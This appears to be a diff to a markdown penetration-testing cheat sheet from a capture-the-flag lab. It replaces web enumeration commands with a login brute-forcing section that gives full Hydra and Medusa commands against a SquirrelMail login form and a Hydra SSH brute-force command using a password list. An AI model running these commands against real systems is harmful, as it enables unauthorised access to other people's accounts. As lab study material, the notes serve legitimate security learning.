@@ -369,21 +369,37 @@ rpcclient -U user <target-IP>
 
 </details>
 
+
+
+
+
+
+
+
 <details>
 <summary>
   
-  ### **Web Enumeration**
+  ### **Login bruteforcing**
 
 </summary>
+
+**Brute-Forcing SquirrelMail Login**
+
+
+Hydra Command:
 ```bash
-gobuster dir -e -u http://10.10.181.27 -w /home/iftx/Desktop/Room/wordlist/common.txt -x .php,.txt,.js,.html
-
-subfinder -d [Target Domain]     # Find subdomains
-
-amass enum -d [Target Domain]    # Active enumeration
+hydra -l milesdyson -P log1.txt 10.10.195.158 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=SquirrelMail - Unknown user or password incorrect" -V -F
 ```
+Medusa Command:
+```bash
+medusa -h 10.10.195.158 -u milesdyson -P log1.txt -M http -m POST:/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1
+```
+Both tools brute-force the login for SquirrelMail using a username (milesdyson) and a password list (log1.txt) to find the correct credentials.
 
-### **Service Enumeration**
+
+
+
+ ### **ssh server**
 ```bash
 hydra -l user_ name -P /home/iftx/Desktop/Room/wordlist/rockyou.txt 10.10.181.27 ssh
 
